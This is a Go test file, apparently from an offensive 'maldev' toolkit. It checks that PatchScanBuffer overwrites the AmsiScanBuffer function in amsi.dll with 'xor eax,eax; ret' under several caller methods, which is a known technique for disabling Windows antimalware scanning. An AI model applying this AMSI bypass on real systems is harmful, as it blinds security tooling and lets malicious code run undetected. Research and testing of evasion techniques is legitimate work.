//go:build windows

package amsi

import (
	"testing"
	"unsafe"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/oioio-space/maldev/testutil"
	"github.com/oioio-space/maldev/win/api"
)

// TestPatchScanBufferCallerMatrix tests PatchScanBuffer with all 4 Caller methods.
func TestPatchScanBufferCallerMatrix(t *testing.T) {
	testutil.RequireIntrusive(t)

	if err := api.Amsi.Load(); err != nil {
		t.Skip("amsi.dll not available")
	}

	for _, c := range testutil.CallerMethods(t) {
		t.Run(c.Name, func(t *testing.T) {
			proc := api.Amsi.NewProc("AmsiScanBuffer")
			if err := proc.Find(); err != nil {
				t.Skip("AmsiScanBuffer not found")
			}
			addr := proc.Addr()

			require.NoError(t, PatchScanBuffer(c.Caller))

			patched := (*[3]byte)(unsafe.Pointer(addr))
			assert.Equal(t, byte(0x31), patched[0], "xor eax,eax (0x31)")
			assert.Equal(t, byte(0xC0), patched[1], "xor eax,eax (0xC0)")
			assert.Equal(t, byte(0xC3), patched[2], "ret (0xC3)")
		})
	}
}
